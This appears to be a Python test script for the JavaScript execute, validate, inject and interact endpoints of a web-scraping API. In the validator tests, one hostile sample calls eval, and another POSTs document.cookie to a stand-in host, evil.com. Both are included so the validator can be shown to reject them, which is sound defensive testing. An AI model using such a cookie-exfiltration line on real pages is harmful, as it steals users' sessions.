#!/usr/bin/env python3
"""
Test script for JavaScript execution endpoints in Gnosis Wraith API v2
"""

import asyncio
import aiohttp
import json
import sys
import os
from typing import Dict, Any, Optional

# Add parent directory to path to import modules
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

class JavaScriptExecutionTester:
    def __init__(self, base_url: str = "http://localhost:5678", api_token: Optional[str] = None):
        self.base_url = base_url
        self.api_token = api_token or os.getenv('GNOSIS_API_TOKEN')
        self.headers = {}
        if self.api_token:
            self.headers['Authorization'] = f'Bearer {self.api_token}'
    
    async def test_execute_endpoint(self):
        """Test the /api/v2/execute endpoint for direct JavaScript execution"""
        print("\n🧪 Testing /api/v2/execute endpoint")
        print("-" * 50)
        
        test_cases = [
            {
                "name": "Extract all links",
                "javascript": """
                    const links = Array.from(document.querySelectorAll('a'));
                    return links.map(link => ({
                        text: link.textContent.trim(),
                        href: link.href
                    }));
                """,
                "url": "https://example.com"
            },
            {
                "name": "Get page title and meta description",
                "javascript": """
                    const title = document.title;
                    const metaDesc = document.querySelector('meta[name="description"]');
                    return {
                        title: title,
                        description: metaDesc ? metaDesc.content : null
                    };
                """,
                "url": "https://example.com"
            },
            {
                "name": "Count images on page",
                "javascript": """
                    const images = document.querySelectorAll('img');
                    return {
                        count: images.length,
                        sources: Array.from(images).map(img => img.src)
                    };
                """,
                "url": "https://example.com"
            }
        ]
        
        async with aiohttp.ClientSession() as session:
            for test in test_cases:
                print(f"\n📝 Test: {test['name']}")
                
                payload = {
                    "url": test["url"],
                    "javascript": test["javascript"],
                    "options": {
                        "wait_before": 1000,
                        "wait_after": 500,
                        "timeout": 10000
                    }
                }
                
                try:
                    async with session.post(
                        f"{self.base_url}/api/v2/execute",
                        json=payload,
                        headers=self.headers
                    ) as response:
                        result = await response.json()
                        
                        if response.status == 200:
                            print(f"✅ Success: {result.get('success', False)}")
                            if result.get('success'):
                                print(f"📊 Result: {json.dumps(result.get('result'), indent=2)[:200]}...")
                            else:
                                print(f"❌ Error: {result.get('error')}")
                        else:
                            print(f"❌ HTTP {response.status}: {result}")
                            
                except Exception as e:
                    print(f"❌ Exception: {str(e)}")
    
    async def test_validate_endpoint(self):
        """Test the /api/v2/validate endpoint for JavaScript validation"""
        print("\n🧪 Testing /api/v2/validate endpoint")
        print("-" * 50)
        
        test_cases = [
            {
                "name": "Safe code",
                "javascript": "return document.title;",
                "should_pass": True
            },
            {
                "name": "Dangerous eval",
                "javascript": "eval('alert(1)');",
                "should_pass": False
            },
            {
                "name": "Dangerous fetch",
                "javascript": "fetch('https://evil.com/steal', {method: 'POST', body: document.cookie});",
                "should_pass": False
            },
            {
                "name": "Safe DOM query",
                "javascript": """
                    const elements = document.querySelectorAll('.item');
                    return elements.length;
                """,
                "should_pass": True
            }
        ]
        
        async with aiohttp.ClientSession() as session:
            for test in test_cases:
                print(f"\n📝 Test: {test['name']}")
                
                payload = {
                    "javascript": test["javascript"]
                }
                
                try:
                    async with session.post(
                        f"{self.base_url}/api/v2/validate",
                        json=payload,
                        headers=self.headers
                    ) as response:
                        result = await response.json()
                        
                        if response.status == 200:
                            is_safe = result.get('is_safe', False)
                            expected = test['should_pass']
                            
                            if is_safe == expected:
                                print(f"✅ Validation correct: is_safe={is_safe}")
                            else:
                                print(f"❌ Validation incorrect: is_safe={is_safe}, expected={expected}")
                            
                            if result.get('violations'):
                                print(f"⚠️  Violations: {result['violations']}")
                        else:
                            print(f"❌ HTTP {response.status}: {result}")
                            
                except Exception as e:
                    print(f"❌ Exception: {str(e)}")
    
    async def test_inject_endpoint(self):
        """Test the /api/v2/inject endpoint for LLM-generated JavaScript"""
        print("\n🧪 Testing /api/v2/inject endpoint")
        print("-" * 50)
        
        # Skip if no LLM token is provided
        llm_token = os.getenv('ANTHROPIC_API_KEY')
        if not llm_token:
            print("⚠️  Skipping LLM tests - no ANTHROPIC_API_KEY found")
            return
        
        test_cases = [
            {
                "name": "Extract email addresses",
                "request": "Find all email addresses on the page and return them as a list",
                "url": "https://example.com"
            },
            {
                "name": "Get form fields",
                "request": "Find all input fields in forms and return their names and types",
                "url": "https://example.com"
            },
            {
                "name": "Extract structured data",
                "request": "Extract any JSON-LD structured data from the page",
                "url": "https://example.com"
            }
        ]
        
        async with aiohttp.ClientSession() as session:
            for test in test_cases:
                print(f"\n📝 Test: {test['name']}")
                
                payload = {
                    "url": test["url"],
                    "request": test["request"],
                    "llm_provider": "anthropic",
                    "llm_token": llm_token,
                    "execute_immediately": True,
                    "return_code": True
                }
                
                try:
                    async with session.post(
                        f"{self.base_url}/api/v2/inject",
                        json=payload,
                        headers=self.headers,
                        timeout=aiohttp.ClientTimeout(total=30)
                    ) as response:
                        result = await response.json()
                        
                        if response.status == 200:
                            print(f"✅ Success: {result.get('success', False)}")
                            
                            if result.get('code'):
                                print(f"📝 Generated code:")
                                print(result['code'][:300] + "..." if len(result['code']) > 300 else result['code'])
                            
                            if result.get('execution', {}).get('success'):
                                print(f"✅ Execution successful")
                                print(f"📊 Result: {json.dumps(result.get('execution', {}).get('result'), indent=2)[:200]}...")
                            else:
                                print(f"❌ Execution failed: {result.get('execution', {}).get('error')}")
                        else:
                            print(f"❌ HTTP {response.status}: {result}")
                            
                except asyncio.TimeoutError:
                    print(f"❌ Request timed out")
                except Exception as e:
                    print(f"❌ Exception: {str(e)}")
    
    async def test_interact_endpoint(self):
        """Test the /api/v2/interact endpoint for page interactions"""
        print("\n🧪 Testing /api/v2/interact endpoint")
        print("-" * 50)
        
        test_cases = [
            {
                "name": "Click and scroll",
                "url": "https://example.com",
                "actions": [
                    {"type": "scroll", "target": "bottom"},
                    {"type": "wait", "duration": 1000},
                    {"type": "click", "selector": "a[href]"},
                ]
            },
            {
                "name": "Fill form fields",
                "url": "https://example.com",
                "actions": [
                    {"type": "fill", "selector": "input[type='text']", "value": "Test input"},
                    {"type": "fill", "selector": "input[type='email']", "value": "test@example.com"},
                ]
            }
        ]
        
        async with aiohttp.ClientSession() as session:
            for test in test_cases:
                print(f"\n📝 Test: {test['name']}")
                
                payload = {
                    "url": test["url"],
                    "actions": test["actions"],
                    "wait_before": 1000,
                    "wait_after": 500
                }
                
                try:
                    async with session.post(
                        f"{self.base_url}/api/v2/interact",
                        json=payload,
                        headers=self.headers
                    ) as response:
                        result = await response.json()
                        
                        if response.status == 200:
                            print(f"✅ Success: {result.get('success', False)}")
                            if result.get('result'):
                                print(f"📊 Actions performed:")
                                for action_result in result.get('result', []):
                                    print(f"  - {action_result}")
                        else:
                            print(f"❌ HTTP {response.status}: {result}")
                            
                except Exception as e:
                    print(f"❌ Exception: {str(e)}")
    
    async def run_all_tests(self):
        """Run all test suites"""
        print("🚀 Starting JavaScript Execution Tests")
        print("=" * 60)
        
        # Check if server is running
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{self.base_url}/api/v2/health") as response:
                    if response.status != 200:
                        print(f"❌ Server not responding at {self.base_url}")
                        return
                    else:
                        print(f"✅ Server is running at {self.base_url}")
        except Exception as e:
            print(f"❌ Cannot connect to server: {str(e)}")
            return
        
        # Run test suites
        await self.test_validate_endpoint()
        await self.test_execute_endpoint()
        await self.test_inject_endpoint()
        await self.test_interact_endpoint()
        
        print("\n✅ All tests completed!")

async def main():
    """Main entry point"""
    # Get configuration from environment or command line
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5678"
    api_token = sys.argv[2] if len(sys.argv) > 2 else os.getenv('GNOSIS_API_TOKEN')
    
    if not api_token:
        print("⚠️  No API token provided. Set GNOSIS_API_TOKEN or pass as second argument.")
        print("   Some endpoints may require authentication.")
    
    tester = JavaScriptExecutionTester(base_url, api_token)
    await tester.run_all_tests()

if __name__ == "__main__":
    asyncio.run(main())